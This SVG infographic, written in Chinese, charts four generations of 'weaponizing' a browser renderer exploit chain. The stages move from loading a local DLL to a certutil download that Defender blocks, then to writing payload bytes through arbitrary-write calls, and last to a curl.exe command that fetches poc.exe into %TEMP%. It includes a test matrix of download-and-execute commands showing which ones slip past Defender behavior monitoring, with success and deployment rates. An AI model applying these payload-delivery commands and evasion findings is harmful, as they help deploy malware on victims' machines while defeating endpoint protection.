<svg xmlns="http://www.w3.org/2000/svg" width="960" height="600" viewBox="0 0 960 600" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#fbfdff"/><stop offset="1" stop-color="#eef2f7"/>
    </linearGradient>
    <linearGradient id="accent" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0" stop-color="#64748b"/><stop offset="1" stop-color="#059669"/>
    </linearGradient>
    <filter id="sh" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="1.5" stdDeviation="2.5" flood-color="#0f172a" flood-opacity="0.10"/>
    </filter>
    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#64748b"/>
    </marker>
  </defs>
  <rect width="960" height="600" fill="url(#bg)"/>
  <text x="480" y="36" text-anchor="middle" font-size="20" font-weight="bold" fill="#0f172a">武器化四代演进：把「实验室链」变成「服务端部署即用链」</text>
  <rect x="380" y="46" width="200" height="3.5" rx="1.75" fill="url(#accent)"/>

  <!-- timeline -->
  <line x1="70" y1="96" x2="890" y2="96" stroke="#cbd5e1" stroke-width="3"/>
  <circle cx="145" cy="96" r="7" fill="#94a3b8" stroke="#fff" stroke-width="2"/>
  <circle cx="365" cy="96" r="7" fill="#dc2626" stroke="#fff" stroke-width="2"/>
  <circle cx="600" cy="96" r="7" fill="#d97706" stroke="#fff" stroke-width="2"/>
  <circle cx="838" cy="96" r="9" fill="#059669" stroke="#fff" stroke-width="2"/>
  <g font-size="12" font-weight="bold" text-anchor="middle">
    <text x="145" y="80" fill="#475569">v1 本地 DLL</text>
    <text x="365" y="80" fill="#991b1b">v2 certutil 下载</text>
    <text x="600" y="80" fill="#92400e">v3 页面内嵌 64KB</text>
    <text x="838" y="80" fill="#065f46">v4 curl 下载 ★</text>
  </g>

  <!-- v1 -->
  <g filter="url(#sh)">
    <rect x="40" y="122" width="215" height="158" rx="10" fill="#ffffff" stroke="#94a3b8"/>
    <rect x="40" y="122" width="215" height="4" rx="2" fill="#94a3b8"/>
  </g>
  <text x="147" y="148" text-anchor="middle" font-size="12" font-weight="bold" fill="#334155">渲染器内 LoadLibraryW</text>
  <text x="147" y="167" text-anchor="middle" font-size="10.5" fill="#64748b" font-family="Consolas,monospace">"C:\pwn\launch64.dll"</text>
  <g font-size="10.5" fill="#64748b" text-anchor="middle">
    <text x="147" y="189">DLL 里 WinInet 下载+启动</text>
    <text x="147" y="206">全链曾稳定取胜（29%/轮）</text>
  </g>
  <rect x="60" y="218" width="175" height="20" rx="10" fill="#fee2e2"/>
  <text x="147" y="232" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#991b1b">✗ 3 处硬编码本地路径</text>
  <g font-size="10" fill="#94a3b8" text-anchor="middle">
    <text x="147" y="254">launch64/poc/evil 全在本机</text>
    <text x="147" y="270">WinInet 已加载才能这么玩</text>
  </g>

  <!-- v2 -->
  <g filter="url(#sh)">
    <rect x="275" y="122" width="215" height="158" rx="10" fill="#ffffff" stroke="#dc2626"/>
    <rect x="275" y="122" width="215" height="4" rx="2" fill="#dc2626"/>
  </g>
  <text x="382" y="148" text-anchor="middle" font-size="12" font-weight="bold" fill="#991b1b">payload 拼 cmd 下载链</text>
  <text x="382" y="167" text-anchor="middle" font-size="10" fill="#b91c1c" font-family="Consolas,monospace">cmd /c certutil -urlcache …</text>
  <g font-size="10.5" fill="#b91c1c" text-anchor="middle">
    <text x="382" y="189">payload 逻辑本身全对：</text>
    <text x="382" y="206">IAT/导出/拼串/调用逐级验证 ✓</text>
  </g>
  <rect x="295" y="218" width="175" height="20" rx="10" fill="#fee2e2"/>
  <text x="382" y="232" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#991b1b">✗ Defender 行为监控拦截</text>
  <g font-size="10" fill="#b91c1c" text-anchor="middle">
    <text x="382" y="254">CreateProcessA gle=5</text>
    <text x="382" y="270">bash 直接 spawn 也是 EPERM</text>
  </g>

  <!-- v3 -->
  <g filter="url(#sh)">
    <rect x="510" y="122" width="215" height="158" rx="10" fill="#ffffff" stroke="#d97706"/>
    <rect x="510" y="122" width="215" height="4" rx="2" fill="#d97706"/>
  </g>
  <text x="617" y="148" text-anchor="middle" font-size="12" font-weight="bold" fill="#92400e">文件字节写进 RX 区</text>
  <text x="617" y="167" text-anchor="middle" font-size="10.5" fill="#b45309" font-family="Consolas,monospace">1.6 万次 arwWrite → 落盘</text>
  <g font-size="10.5" fill="#b45309" text-anchor="middle">
    <text x="617" y="189">功能完全验证成功：</text>
    <text x="617" y="206">%TEMP% 文件字节级一致 ✓</text>
  </g>
  <rect x="522" y="218" width="191" height="20" rx="10" fill="#fee2e2"/>
  <text x="617" y="232" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#991b1b">✗ 垫函数 10→130 扰动堆布局</text>
  <g font-size="10" fill="#b45309" text-anchor="middle">
    <text x="617" y="254">descriptor discovery 29%→3%</text>
    <text x="617" y="270">42 轮仅 2 次到达部署</text>
  </g>

  <!-- v4 (winner) -->
  <g filter="url(#sh)">
    <rect x="745" y="122" width="195" height="158" rx="10" fill="#ecfdf5" stroke="#059669" stroke-width="2"/>
    <rect x="745" y="122" width="195" height="4" rx="2" fill="#059669"/>
  </g>
  <rect x="893" y="112" width="56" height="20" rx="10" fill="#059669"/>
  <text x="921" y="126" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#ffffff">现役 ★</text>
  <text x="842" y="148" text-anchor="middle" font-size="12" font-weight="bold" fill="#065f46">系统 curl.exe 拉双文件</text>
  <text x="842" y="167" text-anchor="middle" font-size="10" fill="#059669" font-family="Consolas,monospace">curl -sf -o a ORIGIN/a …</text>
  <g font-size="10.5" fill="#059669" text-anchor="middle">
    <text x="842" y="189">blob 仅 2.6KB（塞哪都行）</text>
    <text x="842" y="206">原版 10-pad 模块一字不动</text>
  </g>
  <rect x="760" y="218" width="165" height="22" rx="11" fill="#059669"/>
  <text x="842" y="233" text-anchor="middle" font-size="11" font-weight="bold" fill="#ffffff">✓ 43%/轮 · 83% 部署</text>
  <g font-size="10" fill="#065f46" text-anchor="middle">
    <text x="842" y="256">零硬编码 · 零新 DLL</text>
    <text x="842" y="272">同源服务器即可部署</text>
  </g>

  <line x1="257" y1="200" x2="272" y2="200" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <line x1="492" y1="200" x2="507" y2="200" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <line x1="727" y1="200" x2="742" y2="200" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>

  <!-- Defender matrix -->
  <g filter="url(#sh)">
    <rect x="40" y="308" width="900" height="272" rx="10" fill="#ffffff" stroke="#e2e8f0"/>
  </g>
  <text x="490" y="336" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#0f172a">进程创建层拦截实测矩阵（同一台 Win10 19045 · Defender 行为监控开启）</text>
  <!-- header -->
  <rect x="58" y="350" width="864" height="30" rx="6" fill="#0f172a"/>
  <g font-size="11.5" font-weight="bold" fill="#e2e8f0">
    <text x="76" y="370">测试用例（CreateProcessA / 直接 spawn）</text>
    <text x="620" y="370">结果</text>
    <text x="790" y="370">判定</text>
  </g>
  <!-- rows -->
  <g font-family="Consolas,monospace" font-size="11.5">
    <rect x="58" y="384" width="864" height="34" fill="#f8fafc"/>
    <text x="76" y="406" fill="#334155">cmd.exe /c echo hi</text>
    <text x="620" y="406" fill="#059669">ok=1</text>
    <rect x="782" y="392" width="60" height="18" rx="9" fill="#d1fae5"/><text x="812" y="405" text-anchor="middle" font-size="10" font-weight="bold" fill="#065f46">放行</text>

    <rect x="58" y="422" width="864" height="34" fill="#ffffff"/>
    <text x="76" y="444" fill="#334155">cmd.exe /c certutil -urlcache -split -f http://…/poc.exe dst</text>
    <text x="620" y="444" fill="#dc2626">ok=0 gle=5</text>
    <rect x="782" y="430" width="60" height="18" rx="9" fill="#fee2e2"/><text x="812" y="443" text-anchor="middle" font-size="10" font-weight="bold" fill="#991b1b">拦截</text>

    <rect x="58" y="460" width="864" height="34" fill="#f8fafc"/>
    <text x="76" y="482" fill="#334155">同上 · lpApplicationName 显式指定 cmd.exe 全路径</text>
    <text x="620" y="482" fill="#dc2626">ok=0 gle=5</text>
    <rect x="752" y="468" width="120" height="18" rx="9" fill="#fee2e2"/><text x="812" y="481" text-anchor="middle" font-size="10" font-weight="bold" fill="#991b1b">拦截（模式匹配）</text>

    <rect x="58" y="498" width="864" height="34" fill="#ffffff"/>
    <text x="76" y="520" fill="#334155">bash 直接 spawn certutil + 下载 URL</text>
    <text x="620" y="520" fill="#dc2626">spawn EPERM</text>
    <rect x="742" y="506" width="140" height="18" rx="9" fill="#fee2e2"/><text x="812" y="519" text-anchor="middle" font-size="10" font-weight="bold" fill="#991b1b">拦截（含工具链自身）</text>

    <rect x="58" y="536" width="864" height="36" rx="6" fill="#ecfdf5"/>
    <text x="76" y="559" fill="#065f46">curl.exe -sf -o %TEMP%\ms64.exe http://…/poc.exe（相对名/全路径/双文件三变体）</text>
    <text x="620" y="559" fill="#059669">ok=1 ×3, exit=0</text>
    <rect x="762" y="545" width="100" height="18" rx="9" fill="#059669"/><text x="812" y="558" text-anchor="middle" font-size="10" font-weight="bold" fill="#ffffff">全部放行 ✓</text>
  </g>
</svg>
